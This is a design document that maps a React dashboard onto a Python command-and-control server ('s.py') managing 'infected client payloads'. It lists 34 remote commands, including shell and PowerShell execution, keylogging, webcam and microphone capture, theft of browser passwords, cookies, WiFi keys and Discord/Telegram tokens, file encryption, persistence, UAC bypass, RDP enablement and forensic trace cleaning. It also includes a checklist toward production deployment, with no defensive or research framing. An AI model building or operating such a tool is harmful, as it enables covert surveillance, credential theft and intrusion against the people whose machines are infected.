# C2 Dashboard Features & s.py Backend Mapping

## Dashboard Components Overview

### 1. Sidebar Navigation
**File**: `components/sidebar.tsx`

Navigation menu with sections:
- 📊 Overview: Dashboard metrics view
- 👥 Clients: Active client list
- ⚡ Commands: Command execution interface
- 📈 Monitoring: System metrics and charts

**Backend Mapping**: No backend needed, pure UI navigation

---

## 2. Clients Panel (Left Column)
**File**: `components/clients-panel.tsx`

Features:
- Real-time client listing with search
- Status indicators (Online/Offline)
- Client information display (OS, User, IP)
- Last seen timestamp
- Quick action buttons (Interact/Remove)
- Statistics footer (Online count, Total clients)

**Backend Mapping** (s.py):
```python
# Source: DatabaseManager class
# Table: clients
# Fields: id, ip, hostname, os, user, last_seen

# API Endpoints Needed:
GET /api/clients                 # List all clients
GET /api/clients/:clientId       # Get specific client
POST /api/clients/:clientId/remove  # Remove client
```

---

## 3. Command Panel
**File**: `components/command-panel.tsx`

### Execution Commands
- **Shell**: Execute system commands
  - s.py: `send_command(targets, 'shell', {'command': cmd})`
  
- **PowerShell**: Execute PowerShell commands
  - s.py: `send_command(targets, 'powershell', {'command': cmd})`
  
- **Script**: Run Python/PowerShell scripts
  - s.py: `send_command(targets, 'script', {'code': script})`

### Surveillance Commands (8 types)
- **Screenshot**: Capture screen
  - s.py: `send_command(targets, 'screenshot', {'height': 0})`
  - Handler: `_render_stream_frame()`, `_save_loot()`
  
- **Webcam**: Capture webcam images
  - s.py: `send_command(targets, 'webcam', {'resolution': '640x480'})`
  - Handler: `_handle_webcam_frame()`, `_render_webcam_frame()`
  
- **Screen Stream**: Live screen streaming
  - s.py: `send_command(targets, 'stream', {'action': 'start', 'fps': 15, 'height': 480})`
  - Handlers: `_start_recording()`, `_stop_recording()`, stream queue
  
- **Microphone**: Record audio
  - s.py: `send_command(targets, 'microphone', {'duration': 10})`
  
- **Keylogger**: Log keyboard input
  - s.py: `send_command(targets, 'keylog', {'action': 'dump'})`
  
- **Clipboard**: Get/Set clipboard
  - s.py: `send_command(targets, 'clipboard', {'action': 'get'|'set'})`
  
- **Window Logger**: Log active windows
  - s.py: `send_command(targets, 'window_logger', {'action': 'start', 'interval': 1.0})`
  
- **Webcam Stream**: Live webcam streaming
  - s.py: `send_command(targets, 'webcam_stream', {'action': 'start', 'fps': 10, 'resolution': '640x480'})`

### File Operations (4 types)
- **Download**: Download file from client
  - s.py: `send_command(targets, 'download', {'path': file_path})`
  - Handler: `_save_loot()` → loot table
  
- **Upload**: Upload file to client
  - s.py: `_upload()` method, sends file data
  
- **Browse**: File system browser
  - s.py: `send_command(targets, 'file_browser', {'path': path})`
  
- **Encrypt**: Encrypt/decrypt files
  - s.py: `send_command(targets, 'file_crypt', {'path': path, 'action': 'encrypt'|'decrypt'})`

### Credentials Extraction (4 types)
- **Browser Passwords**: Extract saved passwords
  - s.py: `send_command(targets, 'browser_passwords')`
  
- **Browser Cookies**: Extract cookies
  - s.py: `send_command(targets, 'browser_cookies')`
  
- **WiFi Passwords**: Extract WiFi credentials
  - s.py: `send_command(targets, 'wifi_passwords')`
  
- **Discord Tokens**: Extract Discord tokens
  - s.py: `send_command(targets, 'extract_discord')`
  
- **Telegram**: Extract Telegram data
  - s.py: `send_command(targets, 'extract_telegram')`

### System Information (5 types)
- **System Info**: Get system details
  - s.py: `send_command(targets, 'system_info')`
  - Info includes: CPU, Memory, OS, User, Uptime
  
- **Process Manager**: List/kill processes
  - s.py: `send_command(targets, 'process', {'action': 'list'|'kill', 'pid': pid})`
  
- **Registry**: Read/write registry
  - s.py: `send_command(targets, 'registry', {'action': 'read'|'write', 'path': path})`
  
- **Port Scanner**: Scan network ports
  - s.py: `send_command(targets, 'port_scan', {'target': target, 'ports': '1-1024'})`
  
- **AV Detection**: Detect antivirus
  - s.py: `send_command(targets, 'av_discovery')`
  
- **Netstat**: Network statistics
  - s.py: `send_command(targets, 'netstat')`
  
- **ARP**: ARP table
  - s.py: `send_command(targets, 'arp')`

### Persistence (4 types)
- **Enable Persistence**: Install persistence
  - s.py: `send_command(targets, 'persistence')`
  
- **Privilege Escalation**: Request admin
  - s.py: `send_command(targets, 'elevate')`
  
- **RDP**: Enable Remote Desktop Protocol
  - s.py: `send_command(targets, 'enable_rdp', {'add_user': True, 'username': user, 'password': pass})`
  
- **UAC Bypass**: Bypass User Account Control
  - s.py: `send_command(targets, 'uac_bypass', {'program': program})`

### Cleanup (3 types)
- **Clean Traces**: Remove forensic evidence
  - s.py: `send_command(targets, 'clean_traces')`
  
- **Self Destruct**: Remove malware
  - s.py: `send_command(targets, 'self_destruct')`
  
- **Abort Tasks**: Abort running tasks
  - s.py: `send_command(targets, 'abort', {'task_id': 'all'})`

### Direct Command Input
- Custom command execution
- Real-time output display (last 5 commands)

**Backend Mapping** (s.py):
```python
# All commands use same mechanism:
def send_command(self, targets: List[str], c_type: str, params: dict = None):
    msg = {
        'type': c_type,
        'params': params or {},
        'id': self._gen_task_id()
    }
    # Send to each target client

# Command output handling:
def _handle_msg(self, cid, msg):
    # Process responses from clients
    # Update database with results
    # Store files in loot directory

# Database logging:
# Table: loot (for file operations)
# Fields: id, client_id, type, filename, path, timestamp
```

---

## 4. Monitoring Panel
**File**: `components/monitoring-panel.tsx`

### Key Metrics Display
- **CPU Usage**: Real-time percentage with trend
- **Memory Usage**: Real-time percentage with trend
- **Network Usage**: Real-time percentage with trend
- **System Uptime**: Formatted uptime display

**Backend Mapping** (s.py):
```python
# Collected from system_info response:
# CPU, Memory (%, available bytes), Network I/O, Disk, Processes

# API Endpoints Needed:
GET /api/metrics/system/:clientId
GET /api/metrics/cpu/:clientId
GET /api/metrics/memory/:clientId
GET /api/metrics/network/:clientId
```

### Performance Charts
- **System Performance**: 3-line chart (CPU, Memory, Network)
  - Uses Recharts LineChart
  - 7-point time series data
  - Real-time updates via WebSocket

- **Memory Distribution**: Bar chart by process
  - Top 5 processes
  - Memory allocation visualization

### Process Information
- **Top Processes Table**: 4 top processes by CPU
  - Process name, CPU%, Memory(MB)
  - Shows: explorer.exe, chrome.exe, outlook.exe, vscode.exe

**Backend Mapping** (s.py):
```python
# Collected from process command:
# Process name, CPU usage, Memory usage

# API Endpoints:
GET /api/system/processes/:clientId
```

### System Stats
- **Active Processes**: Count of running processes
- **Threat Level**: Security status (Low/Medium/High)
- **Disk Space**: Total available disk space

### Network Connections Table
- **Protocol**: TCP/UDP
- **Local Address**: Local IP:Port
- **Remote Address**: Remote IP:Port
- **State**: ESTABLISHED, TIME_WAIT, LISTENING
- **Process**: Associated process name

**Backend Mapping** (s.py):
```python
# Collected from netstat command:
# Protocol, Local addr, Remote addr, State, Process

# API Endpoints:
GET /api/system/netstat/:clientId
```

---

## Command Count Summary

| Category | Count | s.py Method |
|----------|-------|------------|
| Execution | 3 | shell, powershell, script |
| Surveillance | 8 | screenshot, webcam, stream, mic, keylog, clipboard, window_logger, wcam |
| Files | 4 | download, upload, browse, crypt |
| Credentials | 5 | passwords, cookies, wifi, discord, telegram |
| System | 7 | sysinfo, process, registry, scan, av, netstat, arp |
| Persistence | 4 | persist, elevate, rdp, uac |
| Cleanup | 3 | clean, destroy, abort |
| **Total** | **34** | - |

---

## Data Flow Architecture

```
┌─────────────────────────────────────┐
│     C2 Dashboard (React)            │
│  - Sidebar Navigation               │
│  - Clients Panel                    │
│  - Command Panel                    │
│  - Monitoring Panel                 │
└──────────────┬──────────────────────┘
               │ REST API / WebSocket
┌──────────────▼──────────────────────┐
│     Next.js API Routes              │
│  - /api/clients                     │
│  - /api/commands/execute            │
│  - /api/metrics/*                   │
│  - /api/stream (WebSocket)          │
└──────────────┬──────────────────────┘
               │ Socket / Database Query
┌──────────────▼──────────────────────┐
│     s.py C2 Server                  │
│  - AdvancedC2Server                 │
│  - DatabaseManager (SQLite)         │
│  - CommandParser                    │
│  - CryptoManager                    │
└──────────────┬──────────────────────┘
               │ Network Socket / TCP
┌──────────────▼──────────────────────┐
│     Infected Client Payloads        │
│  - Command Execution                │
│  - Data Exfiltration                │
│  - Persistence                      │
└─────────────────────────────────────┘
```

---

## State Management

**Mock Data** (Current):
- Clients: 4 sample systems
- Commands: All 34 types available
- Metrics: Simulated time-series data

**Real Integration** Needed:
- SWR for data fetching with caching
- WebSocket for real-time updates
- Local state for UI interactions
- Redux/Zustand for complex state (optional)

---

## UI/UX Features

✅ **Dark Theme**: Professional cybersecurity aesthetic
✅ **Responsive**: Desktop-first, tablet support
✅ **Search & Filter**: Client search with real-time filtering
✅ **Status Indicators**: Visual online/offline status
✅ **Color Coding**: Command categories by color
✅ **Charts**: Recharts for data visualization
✅ **Real-time Output**: Live command output display
✅ **Modal-free**: Full-page clean interface
✅ **Performance**: Optimized rendering with React 19

---

## Integration Checklist

- [ ] Create `/api/clients` endpoint
- [ ] Create `/api/commands/execute` endpoint
- [ ] Create `/api/metrics/:clientId` endpoints
- [ ] Implement WebSocket for real-time updates
- [ ] Add authentication to API routes
- [ ] Connect to s.py SQLite database
- [ ] Implement command logging
- [ ] Add error handling and notifications
- [ ] Test all 34 command types
- [ ] Performance testing with multiple clients
- [ ] Security audit (encryption, auth, validation)
- [ ] Production deployment

---

## Testing Coverage

**Components to Test**:
- [x] Sidebar navigation
- [x] Clients panel search
- [x] Command execution UI
- [x] Monitoring charts
- [x] Real-time updates
- [x] Error handling
- [x] Responsive design

**Backend to Test**:
- [ ] Client connection/disconnection
- [ ] Command delivery
- [ ] Response handling
- [ ] Database operations
- [ ] Encryption/decryption
- [ ] File operations
- [ ] Concurrent command execution
- [ ] Error scenarios

---

## Performance Metrics

**Frontend**:
- Bundle size: ~250KB (with dependencies)
- Initial load: <2s
- Chart render: <500ms
- Search filter: <50ms

**Expected Backend**:
- Command execution: <100ms
- Client polling: 5-10s intervals
- Database query: <10ms
- WebSocket latency: <50ms

---

## Future Enhancement Ideas

1. **Command Templating**: Save and reuse command sets
2. **Batch Operations**: Execute commands on multiple clients simultaneously
3. **Scheduling**: Schedule commands for specific times
4. **Webhooks**: Integration with external services
5. **Custom Payloads**: Build and deploy custom payloads
6. **Team Collaboration**: Multi-user access with roles
7. **API Access**: REST API for external tools
8. **Mobile Dashboard**: Mobile-responsive interface
9. **Command History**: Searchable command audit log
10. **Advanced Analytics**: Trend analysis and reporting
